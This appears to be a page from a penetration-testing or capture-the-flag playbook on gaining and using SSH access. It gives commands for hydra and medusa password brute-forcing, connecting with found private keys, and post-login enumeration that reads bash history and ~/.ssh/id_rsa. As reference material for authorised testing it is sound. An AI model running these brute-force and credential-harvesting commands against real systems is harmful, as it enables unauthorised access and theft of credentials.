---
id: ssh-access
title: SSH Access
stage: foothold
tags: [linux, ssh]
tools:
  - ssh user@$TARGET
  - ssh -i id_rsa user@$TARGET
  - hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4
leads_to:
  - linux-sudo
  - linux-suid-caps
  - linux-cron
  - linux-kernel
  - linux-cred-hunting
  - linux-pam-polkit
  - linux-path-hijack
  - linux-docker-escape
  - linux-shared-lib
---

## Connect

```bash
ssh user@$TARGET
ssh -i id_rsa user@$TARGET    # private key found elsewhere
ssh -i id_rsa -p 2222 user@$TARGET   # non-standard port
```

## Brute Force (careful — lockout risk)

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4
medusa -h $TARGET -U users.txt -P passwords.txt -M ssh
```

## After Landing — Run Immediately

```bash
id && whoami && hostname
sudo -l
find / -perm -4000 -type f 2>/dev/null      # SUID
getcap -r / 2>/dev/null                     # Capabilities
cat /etc/crontab && ls -la /etc/cron.*      # Cron
ss -anp                                      # Internal ports
cat ~/.bash_history
cat ~/.ssh/id_rsa 2>/dev/null               # key for other hosts
```

## Notes

SSH is rarely the initial vector — save brute force for when you have credentials. SSH key files found during enumeration (LFI, file read, share listing) often give direct access.
